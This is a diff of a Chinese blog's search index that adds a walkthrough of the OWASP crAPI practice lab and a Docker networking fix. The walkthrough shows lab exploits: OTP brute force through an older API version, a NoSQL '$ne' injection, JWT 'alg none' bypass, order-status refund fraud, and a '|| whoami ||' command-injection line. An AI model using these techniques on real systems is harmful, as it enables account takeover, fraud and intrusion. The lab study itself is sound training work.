@@ -13,6 +13,95 @@
       </tags>
   </entry>
   <entry>
+    <title>linux下doker搭建crapi靶场渗透练习</title>
+    <url>/posts/ad05d80f.html</url>
+    <content><![CDATA[<h1 id="api测试小技巧"><a href="#api测试小技巧" class="headerlink" title="api测试小技巧"></a>api测试小技巧</h1><p>靶场内多个思路可从该文章内参考<br><a href="https://github.com/inonshk/31-days-of-API-Security-Tips">31-days-of-APl-Security-Tips</a><br><a href="https://cloud.tencent.com/developer/article/1805577">API 安全测试的 31 个 Tips</a></p>
+<h1 id="docker-compose搭建crapi"><a href="#docker-compose搭建crapi" class="headerlink" title="docker-compose搭建crapi"></a>docker-compose搭建crapi</h1><p><a href="https://github.com/OWASP/crAPI">Github-crapi项目</a><br>前提：拥有docker及docker-compose组件</p>
+<h1 id="linux环境部署"><a href="#linux环境部署" class="headerlink" title="linux环境部署"></a>linux环境部署</h1><p>由于本次靶场练习环境为虚拟机linux使用docker容器部署crapi，使用windows通过IP+port访问web环境，需对下载yml文件进行修改:<br>(若命令下载yml文件失败可主机下载后粘贴到linux下)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑文件</span><br><span class="line">vim docker-compose.yml</span><br><span class="line"></span><br><span class="line">替换IP</span><br><span class="line">:1,250 s/127.0.0.1/192.168.80.129(your-ip)/g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1,250 s/192.168.80.129/192.168.2.8/g</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>若替换成功，则容器访问web的ip映射为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/workspace/crapi/crAPI-1.1.5]</span><br><span class="line">└─# docker ps                               </span><br><span class="line">CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS                      PORTS                                                       NAMES</span><br><span class="line">34d024bd3e3c   crapi/crapi-web:latest         &quot;/bin/sh -c /etc/ngi…&quot;   48 minutes ago   Up 48 minutes (healthy)     192.168.80.129:8888-&gt;80/tcp, 192.168.80.129:8443-&gt;443/tcp   crapi-web</span><br></pre></td></tr></table></figure>
+
+<p>最新稳定版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
+<p>最新开发版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose pull</span><br><span class="line"></span><br><span class="line">VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d</span><br></pre></td></tr></table></figure>
+<h1 id="web站点结构梳理"><a href="#web站点结构梳理" class="headerlink" title="web站点结构梳理"></a>web站点结构梳理</h1><p>通过设置bp代理，手工浏览网页，target会自动记录站点信息<br><img src="/img/crapi/targetscan.png"></p>
+<h1 id="api结构"><a href="#api结构" class="headerlink" title="api结构"></a>api结构</h1><p>根据对web站点的结构梳理，存在以下api:</p>
+<h2 id="community交流板块"><a href="#community交流板块" class="headerlink" title="community交流板块"></a>community交流板块</h2><h3 id="community界面"><a href="#community界面" class="headerlink" title="community界面"></a>community界面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">community单个帖子</span><br><span class="line">/community/api/v2/community/posts/5y2b9gX7gFHhYeJxQ4STXN</span><br><span class="line"></span><br><span class="line">community板块下所有帖子</span><br><span class="line">/community/api/v2/community/posts/recent?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>
+<h3 id="coupon优惠券验证"><a href="#coupon优惠券验证" class="headerlink" title="coupon优惠券验证"></a>coupon优惠券验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优惠券验证(响应请求方法失败)</span><br><span class="line">/community/api/v2/coupon/validate-coupon</span><br></pre></td></tr></table></figure>
+<h2 id="identify身份认证功能"><a href="#identify身份认证功能" class="headerlink" title="identify身份认证功能"></a>identify身份认证功能</h2><h3 id="auth登录、注册、忘记密码"><a href="#auth登录、注册、忘记密码" class="headerlink" title="auth登录、注册、忘记密码"></a>auth登录、注册、忘记密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forget-password忘记密码功能</span><br><span class="line">/identity/api/auth/forget-password</span><br><span class="line"></span><br><span class="line">login登录功能</span><br><span class="line">/identity/api/auth/login</span><br><span class="line"></span><br><span class="line">signup注册功能</span><br><span class="line">/identity/api/auth/signup</span><br></pre></td></tr></table></figure>
+<h3 id="v3-otp验证"><a href="#v3-otp验证" class="headerlink" title="v3-otp验证"></a>v3-otp验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otp验证功能</span><br><span class="line">/identity/api/auth/v3/check-otp</span><br></pre></td></tr></table></figure>
+<h2 id="v2用户与车辆接口"><a href="#v2用户与车辆接口" class="headerlink" title="v2用户与车辆接口"></a>v2用户与车辆接口</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人用户修改邮箱功能</span><br><span class="line">/identity/api/v2/user/change-email</span><br><span class="line"></span><br><span class="line">个人用户仪表板界面</span><br><span class="line">/identity/api/v2/user/dashboard</span><br><span class="line"></span><br><span class="line">个人头像上传功能</span><br><span class="line">/identity/api/v2/user/pictures</span><br><span class="line"></span><br><span class="line">个人用户密码重置功能</span><br><span class="line">/identity/api/v2/user/reset-password</span><br><span class="line"></span><br><span class="line">个人邮箱重置校验功能</span><br><span class="line">/identity/api/v2/user/verify-email-token</span><br><span class="line"></span><br><span class="line">个人视频上传功能</span><br><span class="line">/identity/api/v2/user/videos</span><br><span class="line"></span><br><span class="line">个人视频名称修改</span><br><span class="line">/identity/api/v2/user/videos/52</span><br><span class="line"></span><br><span class="line">个人视频更换</span><br><span class="line">/identity/api/v2/user/videos/convert_video</span><br></pre></td></tr></table></figure>
+<h3 id="vehicle"><a href="#vehicle" class="headerlink" title="vehicle"></a>vehicle</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人车辆添加功能</span><br><span class="line">/identity/api/v2/vehicle/add_vehicle</span><br><span class="line"></span><br><span class="line">车辆经纬度位置</span><br><span class="line">/identity/api/v2/vehicle/f597527e-a9d9-4c04-a6c6-5a6a82f1905e/location</span><br><span class="line"></span><br><span class="line">购买车辆验证码发送邮箱</span><br><span class="line">/identity/api/v2/vehicle/resend_email</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="workshop"><a href="#workshop" class="headerlink" title="workshop"></a>workshop</h2><h3 id="mechanic"><a href="#mechanic" class="headerlink" title="mechanic"></a>mechanic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/mechanic/mechanic_report?report_id=11</span><br></pre></td></tr></table></figure>
+<h3 id="merchant"><a href="#merchant" class="headerlink" title="merchant"></a>merchant</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/workshop/api/merchant/contact_mechanic</span><br></pre></td></tr></table></figure>
+<h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">订单购买</span><br><span class="line">/workshop/api/shop/orders</span><br><span class="line"></span><br><span class="line">总订单序号</span><br><span class="line">/workshop/api/shop/orders/16</span><br><span class="line"></span><br><span class="line">个人订单页</span><br><span class="line">/workshop/api/shop/orders/all?limit=30&amp;offset=0</span><br><span class="line"></span><br><span class="line">订单取消</span><br><span class="line">/workshop/api/shop/orders/return_order</span><br><span class="line"></span><br><span class="line">产品页</span><br><span class="line">/workshop/api/shop/products?limit=30&amp;offset=0</span><br></pre></td></tr></table></figure>
+
+<h1 id="失效的对象级别授权"><a href="#失效的对象级别授权" class="headerlink" title="失效的对象级别授权"></a>失效的对象级别授权</h1><p>Broken Object Level Authorization，它可以使API 端点不必要地公开很多数据属性，超过了该端点发挥其功能所需的数量，进而导致忽视最低权限原则<br>此漏洞会在无意中为攻击者提供过多的数据，然后攻击者会利用这些数据找到更多漏洞或 挖掘敏感数据</p>
+<h2 id="1-其他用户车辆信息"><a href="#1-其他用户车辆信息" class="headerlink" title="1.其他用户车辆信息"></a>1.其他用户车辆信息</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br>页面显示内容仅有头像、title、上传人名、内容、上传时间<br><img src="/img/crapi/bolaweb.png"><br>抓包显示包含额外的信息如email、vehicle id<br><img src="/img/crapi/bolabp.png"><br>存在接口识别vehicle id定位车辆经纬度的功能<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;vehicle&#x2F;your-vehicle_id&#x2F;location<br>页面功能点位置<br><img src="/img/crapi/locationweb.png"><br>通过修改vehicle id为其他用户的值，可查看其他用户的车辆详细信息<br><img src="/img/crapi/locationbp.png"></p>
+<h2 id="2-其他用户的问题报告"><a href="#2-其他用户的问题报告" class="headerlink" title="2.其他用户的问题报告"></a>2.其他用户的问题报告</h2><p>页面功能点位置，需填写联系的机械师，及报告内容<br><img src="/img/crapi/reportweb.png"><br>可发现vin、报告接收接口及发送次数，拦截该请求并抓返回包<br><img src="/img/crapi/reportbp.png"><br>可发现返回包发现新的接口及报告序号<br><img src="/img/crapi/reportback.png"><br>直接访问其他报告确实authentication，出现缺失JWT认证<br>:<a href="http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1">http://192.168.80.129:8888/workshop/api/mechanic/mechanic_report?report_id=1</a><br><img src="/img/crapi/otherreporterror.png"></p>
+<p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
+<h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
+<h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
+<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#112;&#x6f;&#103;&#x62;&#x61;&#48;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x63;&#111;&#x6d;">&#112;&#x6f;&#103;&#x62;&#x61;&#48;&#x30;&#54;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x63;&#111;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
+<p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
+<h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
+<h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
+<h2 id="5-视频内部属性api接口"><a href="#5-视频内部属性api接口" class="headerlink" title="5.视频内部属性api接口"></a>5.视频内部属性api接口</h2><p>已知关于视频的api接口<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;id值(抓包内的id)<br>&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;convert_video<br>(其内包含 conversion_params”:”-v codec h264 似乎可以管道符命令注入，不过网上资料过少，待以后补充)<br><img src="/img/crapi/uploadvideobp.png"><br>md文档提示可利用泄露的视频api接口利用其他漏洞，尝试越权访问，修改第二个接口上传PUT改为GET并爆破id值失败，无法爆破其他人的视频数据，返回值与当前authentication绑定</p>
+<h1 id="资源缺乏和速率限制"><a href="#资源缺乏和速率限制" class="headerlink" title="资源缺乏和速率限制"></a>资源缺乏和速率限制</h1><p>Lack of Resources &amp; Rate Limiting<br>速率限制是计算机系统中使用的一种技术，用于控制允许请求或操作的速率。它通常用于防止滥用、保护资源和维护系统稳定性。<br>速率限制可以应用于各种环境中，例如API速率限制、登录尝试，甚至可以用于防御DDoS攻击。</p>
+<h2 id="6-使用-“contact-mechanic”-功能完成第7层DoS"><a href="#6-使用-“contact-mechanic”-功能完成第7层DoS" class="headerlink" title="6.使用 “contact mechanic” 功能完成第7层DoS"></a>6.使用 “contact mechanic” 功能完成第7层DoS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">发现一个limit / page参数?(例如:/api/news?limit=100)它可能容易受到7层DoS的攻击。尝试发送一个长值(例如:limit=999999999)，看看会发生什么</span><br></pre></td></tr></table></figure>
+<p>在接口处 &#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic 发现 repeat_request_if_failed 和 number_of_repeats<br><img src="/img/crapi/repeatsbp.png"><br>repeat_request_if_failed值改为true，如果发送失败则再次发送，number_of_repeats值增加，再次发送<br>显示: 服务不可用。似乎是您造成了第7层DoS<br><img src="/img/crapi/ddos.png"></p>
+<p>除此之外在商品显示界面的limit值修改增加也出现了server error不知道算不算ddos<br><img src="/img/crapi/ddoserror.png"></p>
+<h1 id="失效的功能级别授权"><a href="#失效的功能级别授权" class="headerlink" title="失效的功能级别授权"></a>失效的功能级别授权</h1><p>Broken Function Level Authorization<br>功能级别授权中断(BFLA)是一种安全漏洞，当应用程序或系统没有在功能或功能级别正确实施访问控制时会发生。它允许用户执行他们不应该有权限使用的操作或访问功能。</p>
+<h2 id="7-删除其他用户视频"><a href="#7-删除其他用户视频" class="headerlink" title="7.删除其他用户视频"></a>7.删除其他用户视频</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">1.利用REST的可预测特性来查找管理API endpoints!比如你看到一个api叫做GET /api/v1/users/&lt;id&gt;，我们可以试着修改请求方法POST/DELETE来create/delete users.</span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
+<p>测试三个video接口，修改http请求为delete，发现接口&#x2F;identity&#x2F;api&#x2F;v2&#x2F;user&#x2F;videos&#x2F;修改后提示非admin用户，猜测将user修改为admin<br><img src="/img/crapi/deletevideobp1.png"><br>删除成功(若页面显示仍存在视频，可以清空缓存或换浏览器访问)<br><img src="/img/crapi/deletevideobp2.png"><br>目前只删除了个人用户的视频，分析接口后跟随一个数值，猜测该值为所有视频的id值，将包放入intruder模块为id添加payload爆破，删除成功<br><img src="/img/crapi/deleteothervideobp.png"></p>
+<h1 id="批量分配-大量赋值"><a href="#批量分配-大量赋值" class="headerlink" title="批量分配&#x2F;大量赋值"></a>批量分配&#x2F;大量赋值</h1><p>Mass Assignment<br>大规模赋值是一种安全漏洞，当攻击者可以操纵输入数据来修改对象的属性时，就会出现这种漏洞，这通常会导致系统中发生未经授权的更改。<br>当开发人员没有正确地验证和清理用户输入或未能限制对象中哪些属性可以修改时，就会发生这种情况。</p>
+<h2 id="8-免费获得物品"><a href="#8-免费获得物品" class="headerlink" title="8.免费获得物品"></a>8.免费获得物品</h2><p>初始Available Balance为100.选择购买一件商品，值减少为90，若退货成功则值回到100<br>查看所有商品页面的接口，找到status状态存在两种状态，delivered、return pending。交付完毕和等待退货，猜测还有个退货成功的状态<br><img src="/img/crapi/orderstatus.png"><br>点击一个已购买的商品详情，修改请求为PUT，添加参数status值为return尝试将商品状态改为退货状态，显示status值只有’delivered’,’return pending’ or ‘returned’<br><img src="/img/crapi/orderreturnedbp1.png"><br>重新添加参数值为returned，退款成功<br>(货拿到了钱退回来了美滋滋~)<br><img src="/img/crapi/orderreturnedbp2.png"></p>
+<h2 id="9-余额增加"><a href="#9-余额增加" class="headerlink" title="9.余额增加"></a>9.余额增加</h2><p>余额增加的洞目前找到了两种，一种类似上述的免费获得物品，通过修改购买数量再修改status值获得退款余额，就不水了，另一种是通过修改购买接口的数量为负数:<br><img src="/img/crapi/moneyaddbp.png"></p>
+<h2 id="10-更新视频内部属性"><a href="#10-更新视频内部属性" class="headerlink" title="10.更新视频内部属性"></a>10.更新视频内部属性</h2><p>在之前视频属性内部api接口挑战中存在conversation_params参数，值为 -v codec h264，翻找资料似乎为FFmpeg的命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-v codec h264：这是用于指定视频编码的选项。</span><br><span class="line">-v 是视频编码的缩写（等价于 -c:v），用于表明后续设置应用于视频流。</span><br><span class="line">codec 表示要指定的编解码器。</span><br><span class="line">h264 是视频编码的格式，这种编码常用于网络流媒体和视频压缩，具有良好的压缩效率和兼容性。</span><br><span class="line">涉及的技术和知识</span><br><span class="line">视频编码和解码：H.264 是一种视频压缩标准，广泛应用于视频流媒体、视频存储和传输中。了解 H.264 编码格式、编码效率、视频质量和带宽需求等，是视频处理领域的基础知识。</span><br><span class="line">FFmpeg 命令行工具：FFmpeg 提供了丰富的命令选项，可用于各种视频和音频格式的转换与处理。了解 FFmpeg 命令的基础格式（如输入文件、输出文件、编码选项等）可以帮助进行视频处理的自动化。</span><br><span class="line">视频格式与容器：在视频编码的过程中，不仅涉及编码格式，还涉及容器（如 MP4、MKV 等）。不同的容器对视频流和音频流的兼容性也各不相同。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在linux内ffmpeg命令(转换视频编码为 H.264)格式</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 2.mp4</span><br><span class="line"></span><br><span class="line">尝试构造命令执行可成功</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ffmpeg -i 1.mp4 -vcodec h264 || whoami || 3.mp4</span><br><span class="line">...省略一堆内容...</span><br><span class="line">At least one output file must be specified</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>暂时不做深度利用了，单纯修改视频内部属性:(最近爆了一个ffmpeg堆溢出洞有兴趣的可以取康康CVE-2024-7272)<br><img src="/img/crapi/changevideo.png"></p>
+<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="11-crapi发送http至baidu-com并成功返回http响应"><a href="#11-crapi发送http至baidu-com并成功返回http响应" class="headerlink" title="11.crapi发送http至baidu.com并成功返回http响应"></a>11.crapi发送http至baidu.com并成功返回http响应</h2><p>ssrf常出现在向其他服务器请求获取数据的位置，crapi靶场在发送问题报告的接口&#x2F;workshop&#x2F;api&#x2F;merchant&#x2F;contact_mechanic<br>mechanic_api参数存在向url地址请求数据，修改为给<a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="/img/crapi/ssrf.png"></p>
+<h1 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h1><h2 id="12-免费获得优惠券而不知道优惠券代码"><a href="#12-免费获得优惠券而不知道优惠券代码" class="headerlink" title="12.免费获得优惠券而不知道优惠券代码"></a>12.免费获得优惠券而不知道优惠券代码</h2><p>题目提示为nosql注入，优惠券相关接口:<br>&#x2F;community&#x2F;api&#x2F;v2&#x2F;coupon&#x2F;validate-coupon<br>猜测数据库构造的语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#x27;优惠券值&#x27;&#125;)</span><br></pre></td></tr></table></figure>
+<p>对该查询语句的绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;coupon_code&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;</span><br></pre></td></tr></table></figure>
+<p>写入后查询语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.coupon.find(&#123;&#x27;coupon_code&#x27;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125; &#125;)</span><br></pre></td></tr></table></figure>
+<p>相当于SQL注入的:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM coupon WHERE coupon_code &lt;&gt; &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/crapi/nosqlinject.png"></p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="13-找到一种方法来兑换您已经通过修改数据库领取的优惠券"><a href="#13-找到一种方法来兑换您已经通过修改数据库领取的优惠券" class="headerlink" title="13.找到一种方法来兑换您已经通过修改数据库领取的优惠券"></a>13.找到一种方法来兑换您已经通过修改数据库领取的优惠券</h2><p><img src="/img/crapi/applycode.png"><br>题目提示sql注入，对coupon_code输入其他值显示不存在<br><img src="/img/crapi/sqlinjecterror.png"><br>sql注入成功(但显示这张券已被使用，似乎兑换券只有一张？？)<br><img src="/img/crapi/sqlinject.png"></p>
+<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h2 id="14-不为用户执行身份验证的api接口"><a href="#14-不为用户执行身份验证的api接口" class="headerlink" title="14.不为用户执行身份验证的api接口"></a>14.不为用户执行身份验证的api接口</h2><p>不需要cookies或authentication即可访问的页面<br><img src="/img/crapi/unauthentic.png"></p>
+<h1 id="JWT漏洞"><a href="#JWT漏洞" class="headerlink" title="JWT漏洞"></a>JWT漏洞</h1><h2 id="15-jwt令牌绕过"><a href="#15-jwt令牌绕过" class="headerlink" title="15.jwt令牌绕过"></a>15.jwt令牌绕过</h2><p>将jwt验证alg值改为none<br><img src="/img/crapi/jwt1.png"><br>将authentication的signature删除<br><img src="/img/crapi/jwt2.png"></p>
+<h1 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h1><p>使用clash&amp;switchomega+google+burpsuite时。<br>虚拟机linux使用docker部署crapi，本机google通过ip+端口访问crapi-web。<br>出现：<br>switch需使用全局proxy，即配置的clash端口7890代理<br>然后对特定的ip+端口设置为burp代理</p>
+<p>这才能实现crapi车辆定位功能<br>无论是bp使用上游代理还是switch只配置clash的proxy都无法实现车辆定位功能页面的访问</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>API安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
+    <url>/posts/432259a6.html</url>
+    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
+<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
+<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
+<p>修改完成后可访问成功</p>
+]]></content>
+      <categories>
+        <category>报错</category>
+      </categories>
+      <tags>
+        <tag>docker报错</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>anaconda使用</title>
     <url>/posts/a5f86784.html</url>
     <content><![CDATA[<h1 id="创建新的环境"><a href="#创建新的环境" class="headerlink" title="创建新的环境"></a>创建新的环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name myenv</span><br></pre></td></tr></table></figure>
@@ -35,22 +124,6 @@
       </categories>
       <tags>
         <tag>anaconda</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
-    <url>/posts/432259a6.html</url>
-    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
-<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
-<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
-<p>修改完成后可访问成功</p>
-]]></content>
-      <categories>
-        <category>报错</category>
-      </categories>
-      <tags>
-        <tag>docker报错</tag>
       </tags>
   </entry>
   <entry>
@@ -119,76 +192,23 @@
       </tags>
   </entry>
   <entry>
-    <title>linux下doker搭建crapi靶场渗透练习</title>
-    <url>/posts/ad05d80f.html</url>
-    <content><![CDATA[<h1 id="api测试小技巧"><a href="#api测试小技巧" class="headerlink" title="api测试小技巧"></a>api测试小技巧</h1><p>靶场内多个思路可从该文章内参考<br>摘: <a href="https://github.com/inonshk/31-days-of-API-Security-Tips">https://github.com/inonshk/31-days-of-API-Security-Tips</a><br>中文: <a href="https://cloud.tencent.com/developer/article/1805577">https://cloud.tencent.com/developer/article/1805577</a></p>
-<h1 id="docker-compose搭建crapi"><a href="#docker-compose搭建crapi" class="headerlink" title="docker-compose搭建crapi"></a>docker-compose搭建crapi</h1><p>crapi项目: <a href="https://github.com/OWASP/crAPI">https://github.com/OWASP/crAPI</a><br>前提：拥有docker及docker-compose组件</p>
-<h1 id="linux环境部署"><a href="#linux环境部署" class="headerlink" title="linux环境部署"></a>linux环境部署</h1><p>由于本次靶场练习环境为虚拟机linux使用docker容器部署crapi，使用windows通过IP+port访问web环境，需对下载yml文件进行修改:<br>(若命令下载yml文件失败可主机下载后粘贴到linux下)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑文件</span><br><span class="line">vim docker-compose.yml</span><br><span class="line"></span><br><span class="line">替换IP</span><br><span class="line">:1,250 s/127.0.0.1/192.168.80.129(your-ip)/g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1,250 s/192.168.80.129/192.168.2.8/g</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>若替换成功，则容器访问web的ip映射为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/workspace/crapi/crAPI-1.1.5]</span><br><span class="line">└─# docker ps                               </span><br><span class="line">CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS                      PORTS                                                       NAMES</span><br><span class="line">34d024bd3e3c   crapi/crapi-web:latest         &quot;/bin/sh -c /etc/ngi…&quot;   48 minutes ago   Up 48 minutes (healthy)     192.168.80.129:8888-&gt;80/tcp, 192.168.80.129:8443-&gt;443/tcp   crapi-web</span><br></pre></td></tr></table></figure>
+    <title>内网穿透工具FRP</title>
+    <url>/posts/fe1704c8.html</url>
